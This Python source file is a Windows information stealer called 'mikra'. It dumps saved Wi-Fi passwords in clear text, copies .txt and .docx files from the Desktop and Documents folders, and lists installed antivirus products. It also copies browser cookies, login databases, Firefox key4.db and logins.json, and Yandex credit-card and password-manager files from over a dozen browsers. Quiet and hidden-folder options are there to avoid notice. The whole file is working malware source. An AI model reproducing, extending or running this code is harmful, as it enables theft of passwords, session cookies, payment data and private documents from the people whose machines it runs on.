#!/usr/bin/python
# -*- coding: utf-8 -*-

import ctypes
import datetime
import fnmatch
import getpass
import locale
import os
import platform
import shutil
import socket
import subprocess
import sys
import requests
import netifaces
import GPUtil
import psutil
import time
from win32com.client import GetObject
from win32api import GetSystemMetrics
from shutil import copyfile

try:
    if __name__ == "__main__":
        if "all" in str(sys.argv) or "network" in str(sys.argv) or "hardware" in str(sys.argv) or "filegraber" in str(
                sys.argv) or "browsers" in str(sys.argv) or "antisoftware" in str(sys.argv):
            starttime = time.time()
            windll = ctypes.windll.kernel32
            lang = locale.windows_locale[windll.GetUserDefaultUILanguage()]
            encoding = locale.getpreferredencoding()
            typeos = platform.system() + " " + platform.release()
            timedate = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
            timed = datetime.datetime.now().strftime("%H:%M:%S").replace(":", "-", 2)
            user = getpass.getuser()
            hostname = socket.gethostname()
            iip = socket.gethostbyname(socket.gethostname())
            gatewayip = netifaces.gateways()["default"][netifaces.AF_INET][0]
            prefix = "{~}"
            timedate = prefix + " " + timedate
            dirname = user + "_" + timed
            dio = dirname
            os.makedirs(dirname)


            def get_eip():
                try:
                    global eip
                    response = requests.get("https://ipinfo.io/json")
                    rl = response.json()
                    eip = rl["ip"]
                except Exception:
                    return None


            get_eip()


            def get_bssid():
                try:
                    global bssidstr
                    output = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode(encoding).split(
                        "\n")
                    bssidstr = str(output[9].split()[2])
                except Exception:
                    return None


            get_bssid()

            if "-q" not in str(sys.argv):
                print("""
	 ___      ___   __     __   ___   _______        __      
	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
	 /\   \/.    | |:  |  |    __/  |_____/   )   /' /\  \   
	|: \.        | |.  |  (// _  \   //      /   //  __'  \  
	|.  \    /:  | /\  |\ |: | \  \ |:  __   \  /   /  \\   \ 
	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)
                                                         
			""")
                print(timedate, "\n(")
                print("	System: " + typeos)
                print("	Hostname: ", hostname)
                print(" 	Username: ", user)
                print(" 	Language: ", lang)


            def creatinglog():
                global logfile
                logfile = open(dio + "\\" + user + "-log" + ".json", "w")
                logfile.write("""
	 ___      ___   __     __   ___   _______        __      
	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
	 /\   \/.    | |:  |  |    __/  |_____/   )   /' /\  \   
	|: \.        | |.  |  (// _  \   //      /   //  __'  \  
	|.  \    /:  | /\  |\ |: | \  \ |:  __   \  /   /  \\  \ 
	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)


{0}
(
	System: {1}
	Hostname: {2}
	Username: {3}
	Language: {4}""".format(timedate, typeos, hostname, user, lang))


            creatinglog()


            def networkpass(one, two):
                try:
                    cost = 0
                    data = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode(encoding).split("\n")
                    profiles = [i.split(":")[1][1:-1] for i in data if one in i]
                    if "-q" not in str(sys.argv):
                        print(" 	 Wi-Fi's [")
                    logfile.write("\n	 Wi-Fi's [\n")
                    for i in profiles:
                        results = subprocess.check_output(["netsh", "wlan", "show", "profile", i, "key=clear"]).decode(
                            encoding).split("\n")
                        results = [b.split(":")[1][1:-1] for b in results if two in b]
                        try:
                            if "-q" not in str(sys.argv):
                                print("	   {0}:{1}".format(i, results[0]))
                            logfile.write("		{0}:{1}\n".format(i, results[0]))
                            cost += 1
                        except IndexError:
                            if "-q" not in str(sys.argv):
                                print("	   {0}:{1}".format(i, ""))
                            logfile.write("		{0}:{1}\n".format(i, ""))

                except Exception:
                    pass


            if "all" in str(sys.argv) or "network" in str(sys.argv):
                if "-q" not in str(sys.argv):
                    print(" 	{~} Network: ")
                    print(" 	 External ip: ", eip)
                    print(" 	 Internal ip: ", iip)
                    print(" 	 Gateway ip: ", gatewayip)
                    print(" 	 BSSID: %s" % bssidstr)
                logfile.write("""
    {0} Network: 
     External ip: {1}
     Internal ip: {2}
     Gateway ip: {3}
     BSSID: {4}""".format(prefix, eip, iip, gatewayip, bssidstr))
                if lang == "en_US":
                    networkpass("All User Profile", "Key Content")
                    if "-q" not in str(sys.argv):
                        print("	 ]")
                    logfile.write("	 ]")
                elif lang == "ru_RU":
                    networkpass("Все профили пользователей", "Содержимое ключа")
                    if "-q" not in str(sys.argv):
                        print("	 ]")
                    logfile.write("	 ]")

            if "all" in str(sys.argv) or "hardware" in str(sys.argv):
                if "-q" not in str(sys.argv):
                    print(" 	{~} Hardware: ")


                def get_cpu_type():
                    root_winmgmts = GetObject("winmgmts:root\cimv2")
                    cpus = root_winmgmts.ExecQuery("Select * from Win32_Processor")
                    return cpus[0].Name


                def get_size(bytes, suffix="B"):
                    factor = 1024
                    for unit in ["", "K", "M", "G", "T", "P"]:
                        if bytes < factor:
                            return f"{bytes:.2f}{unit}{suffix}"
                        bytes /= factor


                try:
                    gpus = GPUtil.getGPUs()
                    for gpu in gpus:
                        gpu_name = gpu.name

                    svmem = psutil.virtual_memory()
                    if "-q" not in str(sys.argv):
                        print(" 	 CPU: ", get_cpu_type())
                        print(" 	 GPU: ", gpu_name)
                        print(" 	 RAM: ", get_size(svmem.total))
                        print(" 	 Resolution: ", str(GetSystemMetrics(0)) + " x " + str(GetSystemMetrics(1)))
                    logfile.write("""
    {0} Hardware:
     CPU: {1}
     GPU: {2}
     RAM: {3}
     Resolution: {4}""".format(prefix, get_cpu_type(), gpu_name, get_size(svmem.total),
                               str(GetSystemMetrics(0)) + " x " + str(GetSystemMetrics(1))))
                except Exception as ex:
                    print(ex)


            def findall(pattern, path, pok):
                global result
                result = 0
                for root, dirs, files in os.walk(path):
                    for name in files:
                        if fnmatch.fnmatch(name, pattern):
                            try:
                                fileg = os.path.join(root, name)
                                copyfile(fileg, dio + pok + name)
                                result += 1
                            except Exception:
                                pass


            if "all" in str(sys.argv) or "filegraber" in str(sys.argv):
                os.makedirs(dio + "\\Documents")
                findall("*.txt", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
                res1t = "%.2i" % result
                findall("*.txt", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
                resst = int(res1t) + int("%.2i" % result)
                findall("*.docx", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
                res1w = "%.2i" % result
                findall("*.docx", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
                ressw = int(res1w) + int("%.2i" % result)
                if "-q" not in str(sys.argv):
                    print(" 	{~} File graber: ")
                    print(" 	 Found .txt: ", resst)
                    print(" 	 Found .docx: ", ressw)
                logfile.write("""
    {0} File graber:
     Found .txt: {1}
     Found .docx: {2}""".format(prefix, resst, ressw))


            def listanti():
                try:
                    global alist
                    alist = []
                    acommand = "wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName"
                    adata = subprocess.check_output(acommand).decode(encoding).split("\r")[2:-4]

                    if "-q" not in str(sys.argv):
                        print(" 	{~} Antivirus software: ")

                    logfile.write("""
    {0} Antivirus software:""".format(prefix))

                    for i in range(len(adata)):
                        rest = adata[i]
                        rest = rest.replace("\n", "")
                        if rest != "" and rest not in alist:
                            alist.append(rest)
                            logfile.write("""
     + {0}""".format(rest))
                            if "-q" not in str(sys.argv):
                                print(" 	 + " + rest)
                except Exception as eex:
                    print(eex)


            if "all" in str(sys.argv) or "antisoftware" in str(sys.argv):
                listanti()


            def browsers():
                def findone(pattern, path, pok):
                    for root, dirs, files in os.walk(path):
                        for name in files:
                            if fnmatch.fnmatch(name, pattern):
                                try:
                                    fileg = os.path.join(root, name)
                                    copyfile(fileg, dio + pok + name)
                                    return True
                                except Exception as exxx:
                                    print(exxx)
                                    return False

                def checkp(title):
                    if "-q" not in str(sys.argv):
                        print(title)

                if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)
                    if os.path.exists(dio + "\\Google Chrome"):
                        shutil.rmtree(dio + "\\Google Chrome")
                    os.makedirs(dio + "\\Google Chrome")
                    checkp(" 	{~} Google Chrome:")
                    try:
                        if findone("Cookies", src, "\\Google Chrome\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\Google Chrome\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\Google Chrome\\"):
                            checkp(" 	 + History")
                        if findone("Login Data", src, "\\Google Chrome\\"):
                            checkp(" 	 + Login Data")
                        if findone("Web Data", src, "\\Google Chrome\\"):
                            checkp(" 	 + Web Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable".format(user)):
                    src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\".format(user)
                    if os.path.exists(dio + "\\Opera GX"):
                        shutil.rmtree(dio + "\\Opera GX")
                    os.makedirs(dio + "\\Opera GX")
                    checkp(" 	{~} Opera GX:")
                    try:
                        if findone("Cookies", src, "\\Opera GX\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\Opera GX\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\Opera GX\\"):
                            checkp(" 	 + History")
                        if findone("Login Data", src, "\\Opera GX\\"):
                            checkp(" 	 + Login Data")
                        if findone("Web Data", src, "\\Opera GX\\"):
                            checkp(" 	 + Web Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable".format(user)):
                    src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable\\".format(user)
                    if os.path.exists(dio + "\\Opera"):
                        shutil.rmtree(dio + "\\Opera")
                    os.makedirs(dio + "\\Opera")
                    checkp(" 	{~} Opera:")
                    try:
                        if findone("Cookies", src, "\\Opera\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\Opera\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\Opera\\"):
                            checkp(" 	 + History")
                        if findone("Login Data", src, "\\Opera\\"):
                            checkp(" 	 + Login Data")
                        if findone("Web Data", src, "\\Opera\\"):
                            checkp(" 	 + Web Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles".format(user)):
                    src = "C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles\\".format(user)
                    if os.path.exists(dio + "\\Firefox"):
                        shutil.rmtree(dio + "\\Firefox")
                    os.makedirs(dio + "\\Firefox")
                    checkp(" 	{~} Firefox:")
                    try:
                        if findone("cookies.sqlite", src, "\\Firefox\\"):
                            checkp(" 	 + Cookies")
                        if findone("places.sqlite", src, "\\Firefox\\"):
                            checkp(" 	 + History")
                            checkp(" 	 + Bookmarks")
                        if findone("key4.db", src, "\\Firefox\\"):
                            checkp(" 	 + Saved Passwords")
                        if findone("logins.json", src, "\\Firefox\\"):
                            checkp(" 	 + Login Data")
                        if findone("formhistory.sqlite", src, "\\Firefox\\"):
                            checkp(" 	 + Form Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists(
                        "C:\\Users\\{0}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default".format(user)):
                    src = "C:\\Users\\{0}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default".format(user)
                    if os.path.exists(dio + "\\Yandex"):
                        shutil.rmtree(dio + "\\Yandex")
                    os.makedirs(dio + "\\Yandex")
                    checkp(" 	{~} Yandex:")
                    try:
                        if findone("Cookies", src, "\\Yandex\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\Yandex\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\Yandex\\"):
                            checkp(" 	 + History")
                        if findone("Login Data", src, "\\Yandex\\"):
                            checkp(" 	 + Login Data")
                        if findone("Web Data", src, "\\Yandex\\"):
                            checkp(" 	 + Web Data")
                        if findone("Ya Autofill Data", src, "\\Yandex\\"):
                            checkp(" 	 + Autofill Data")
                        if findone("Ya Credit Cards", src, "\\Yandex\\"):
                            checkp(" 	 + Credit Cards Data")
                        if findone("Ya Passman Data", src, "\\Yandex\\"):
                            checkp(" 	 + Passman Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists("C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)):
                    src = "C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)
                    if os.path.exists(dio + "\\Vivaldi"):
                        shutil.rmtree(dio + "\\Vivaldi")
                    os.makedirs(dio + "\\Vivaldi")
                    checkp(" 	{~} Vivaldi:")
                    try:
                        if findone("Cookies", src, "\\Vivaldi\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\Vivaldi\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\Vivaldi\\"):
                            checkp(" 	 + History")
                        if findone("Web Data", src, "\\Vivaldi\\"):
                            checkp(" 	 + Web Data")
                        if findone("Login Data", src, "\\Vivaldi\\"):
                            checkp(" 	 + Login Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists(
                        "C:/Users/{0}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/".format(user)):
                    src = "C:/Users/{0}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/".format(user)
                    if os.path.exists(dio + "\\Brave"):
                        shutil.rmtree(dio + "\\Brave")
                    os.makedirs(dio + "\\Brave")
                    checkp(" 	{~} Brave:")
                    try:
                        if findone("Cookies", src, "\\Brave\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\Brave\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\Brave\\"):
                            checkp(" 	 + History")
                        if findone("Login Data", src, "\\Brave\\"):
                            checkp(" 	 + Login Data")
                        if findone("Web Data", src, "\\Brave\\"):
                            checkp(" 	 + Web Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)
                    if os.path.exists(dio + "\\Chrome Canary"):
                        shutil.rmtree(dio + "\\Chrome Canary")
                    os.makedirs(dio + "\\Chrome Canary")
                    checkp(" 	 {~} Chrome Canary:")
                    try:
                        if findone("Cookies", src, "\\Chrome Canary\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\Chrome Canary\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\Chrome Canary\\"):
                            checkp(" 	 + History")
                        if findone("Login Data", src, "\\Chrome Canary\\"):
                            checkp(" 	 + Login Data")
                        if findone("Web Data", src, "\\Chrome Canary\\"):
                            checkp(" 	 + Web Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists("C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)
                    if os.path.exists(dio + "\\Chromium"):
                        shutil.rmtree(dio + "\\Chromium")
                    os.makedirs(dio + "\\Chromium")
                    checkp(" 	 {~} Chromium:")
                    try:
                        if findone("Cookies", src, "\\Chromium\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\Chromium\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\Chromium\\"):
                            checkp(" 	 + History")
                        if findone("Login Data", src, "\\Chromium\\"):
                            checkp(" 	 + Login Data")
                        if findone("Web Data", src, "\\Chromium\\"):
                            checkp(" 	 + Web Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists("C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)
                    if os.path.exists(dio + "\\CocCoc"):
                        shutil.rmtree(dio + "\\CocCoc")
                    os.makedirs(dio + "\\CocCoc")
                    checkp(" 	{~} CocCoc:")
                    try:
                        if findone("Cookies", src, "\\CocCoc\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\CocCoc\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\CocCoc\\"):
                            checkp(" 	 + History")
                        if findone("Login Data", src, "\\CocCoc\\"):
                            checkp(" 	 + Login Data")
                        if findone("Web Data", src, "\\CocCoc\\"):
                            checkp(" 	 + Web Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists("C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)
                    if os.path.exists(dio + "\\Atom"):
                        shutil.rmtree(dio + "\\Atom")
                    os.makedirs(dio + "\\Atom")
                    checkp(" 	{~} Atom:")
                    try:
                        if findone("Cookies", src, "\\Atom\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\Atom\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\Atom\\"):
                            checkp(" 	 + History")
                        if findone("Login Data", src, "\\Atom\\"):
                            checkp(" 	 + Login Data")
                        if findone("Web Data", src, "\\Atom\\"):
                            checkp(" 	 + Web Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists("C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)
                    if os.path.exists(dio + "\\Orbitum"):
                        shutil.rmtree(dio + "\\Orbitum")
                    os.makedirs(dio + "\\Orbitum")
                    checkp(" 	 {~} Orbitum")
                    try:
                        if findone("Cookies", src, "\\Orbitum\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\Orbitum\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\Orbitum\\"):
                            checkp(" 	 + History")
                        if findone("Login Data", src, "\\Orbitum\\"):
                            checkp(" 	 + Login Data")
                        if findone("Web Data", src, "\\Orbitum\\"):
                            checkp(" 	 + Web Data")
                    except Exception as exx:
                        print(exx)

                if os.path.exists("C:/Users/{0}/AppData/Local/Torch/User Data/Default".format(user)):
                    src = "C:/Users/{0}/AppData/Local/Torch/User Data/Default".format(user)
                    if os.path.exists(dio + "\\Torch"):
                        shutil.rmtree(dio + "\\Torch")
                    os.makedirs(dio + "\\Torch")
                    checkp(" 	 {~} Torch")
                    try:
                        if findone("Cookies", src, "\\Torch\\"):
                            checkp(" 	 + Cookies")
                        if findone("Bookmarks", src, "\\Torch\\"):
                            checkp(" 	 + Bookmarks")
                        if findone("History", src, "\\Torch\\"):
                            checkp(" 	 + History")
                        if findone("Login Data", src, "\\Torch\\"):
                            checkp(" 	 + Login Data")
                        if findone("Web Data", src, "\\Torch\\"):
                            checkp(" 	 + Web Data")
                    except Exception as exx:
                        print(exx)


            if "all" in str(sys.argv) or "browsers" in str(sys.argv):
                browsers()

            if "-xh" in str(sys.argv):
                ctypes.windll.kernel32.SetFileAttributesW(dio, 0x02)

            totaltime = time.time() - starttime
            logfile.write("\n    Elapsed time: %s second's\n)" % totaltime)
            logfile.close()

            if "-q" not in str(sys.argv):
                print(" 	Elapsed time: %s second's\n)" % totaltime)
        else:
            print("""
	 ___      ___   __     __   ___   _______        __      
	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
	 /\   \/.    | |:  |  |    __/  |_____/   )   /' /\  \   
	|: \.        | |.  |  (// _  \   //      /   //  __'  \  
	|.  \    /:  | /\  |\ |: | \  \ |:  __   \  /   /  \\  \ 
	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)


Usage: mikra.exe [-h] [-xh] [-q]
		 {all, network, hardware, filegraber, antisoftware, browsers}

Positional arguments:
 all		Launches all modules
 network	Launches network module
 hardware	Launches hardware module
 filegraber	Launches file graber module
 antisoftware   Launches antisoftware module
 browsers	Launches browsers module

Optional arguments:
 -h		Show help.
 -q		Nothing will be print.
 -xh		Set hidden attribute to mikra dir.""")
except KeyboardInterrupt:
    sys.exit("\nKeyboardInterrupt")
